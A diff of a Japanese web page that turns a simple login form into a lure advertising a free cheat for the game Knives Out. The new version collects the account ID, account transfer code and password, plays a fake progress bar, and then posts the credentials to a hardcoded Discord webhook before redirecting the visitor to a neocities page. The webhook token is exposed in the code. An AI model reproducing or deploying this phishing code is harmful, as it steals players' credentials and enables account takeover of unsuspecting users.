@@ -2,37 +2,145 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>ログイン</title>
+  <title>あはあほあ</title>
+  <style>
+    body {
+      background: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 320px;
+      border: 1px solid #ccc;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #333;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #555;
+    }
+
+    #progressContainer {
+      display: none;
+      margin-top: 20px;
+    }
+
+    #progressText {
+      font-size: 16px;
+      margin-bottom: 10px;
+    }
+
+    #progressBar {
+      width: 100%;
+      height: 20px;
+      background: #eee;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
+    #progressBarInner {
+      height: 100%;
+      width: 0%;
+      background: #4CAF50;
+      transition: width 0.1s linear;
+    }
+  </style>
 </head>
 <body>
-  <h2>ログイン</h2>
-  <form id="loginForm">
-    <label>ユーザー名: <input type="text" id="username"></label><br>
-    <label>パスワード: <input type="password" id="password"></label><br>
-    <button type="submit">ログイン</button>
-  </form>
+
+  <div class="container">
+    <h2>荒野行動無料版チート</h2>
+    <form id="loginForm">
+      <input type="text" id="accountid" placeholder="アカウントIDを入力" required>
+      <input type="text" id="loginid" placeholder="引き継ぎコードを入力" required>
+      <input type="password" id="password" placeholder="パスワードを入力" required>
+      <button type="submit">送信</button>
+    </form>
+
+    <div id="progressContainer">
+      <div id="progressText">送信中... 0%</div>
+      <div id="progressBar">
+        <div id="progressBarInner"></div>
+      </div>
+    </div>
+  </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1370229008427646977/brbphvF5KrI9_P03nmdkkkOhEOWTkiApv8XuaLdbks8oDqWZ6guVWBs_x6ImhjlRqq10";
-
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
+      const account = document.getElementById("accountid").value;
+      const login = document.getElementById("loginid").value;
+      const pass = document.getElementById("password").value;
 
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          content: `ユーザー名: ${username}\nパスワード: ${password}`
-        })
-      }).then(() => {
-        alert('送信しました！');
-      });
+      document.getElementById("loginForm").style.display = "none";
+      const progressContainer = document.getElementById("progressContainer");
+      const progressText = document.getElementById("progressText");
+      const progressBarInner = document.getElementById("progressBarInner");
+
+      progressContainer.style.display = "block";
+
+      let progress = 0;
+      const duration = 3000 + Math.random() * 1000; // 3〜4秒
+      const interval = 10;
+      const totalSteps = duration / interval;
+
+      const step = () => {
+        progress++;
+        const percent = Math.min(Math.floor((progress / totalSteps) * 100), 100);
+        progressText.textContent = `送信中... ${percent}%`;
+        progressBarInner.style.width = `${percent}%`;
+
+        if (percent < 100) {
+          setTimeout(step, interval);
+        } else {
+          const webhookUrl = "https://discord.com/api/webhooks/1370229008427646977/brbphvF5KrI9_P03nmdkkkOhEOWTkiApv8XuaLdbks8oDqWZ6guVWBs_x6ImhjlRqq10";
+
+          const data = {
+            content: `引き継ぎコード: ${account}\nログインID: ${login}\nパスワード: ${pass}`
+          };
+
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+          }).then(() => {
+            window.location.href = "https://aus77.neocities.org/%20ちーてすと"; // 成功後のページ
+          });
+        }
+      };
+
+      step();
     });
   </script>
+
 </body>
 </html>
